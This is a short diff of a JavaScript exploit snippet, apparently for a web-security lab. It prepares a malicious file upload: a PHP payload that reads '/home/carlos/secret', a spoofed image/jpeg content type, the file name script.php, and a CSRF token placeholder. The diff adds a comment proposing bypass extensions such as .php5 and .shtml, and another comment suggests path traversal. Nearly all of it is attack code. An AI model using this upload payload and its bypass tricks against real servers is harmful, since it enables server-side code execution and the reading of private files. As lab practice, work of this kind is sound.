@@ -1,6 +1,7 @@
 const typeYouWant = `image/jpeg`;
 const payload = `<?php echo file_get_contents('/home/carlos/secret'); ?>`;
 // sometimes using path traversal could help if it wont execute
+// or lesser known file extensions .php5 .shtml
 const name="script.php";
 
 const csrfToken="getThisTOken probably need to this parameter asswell";
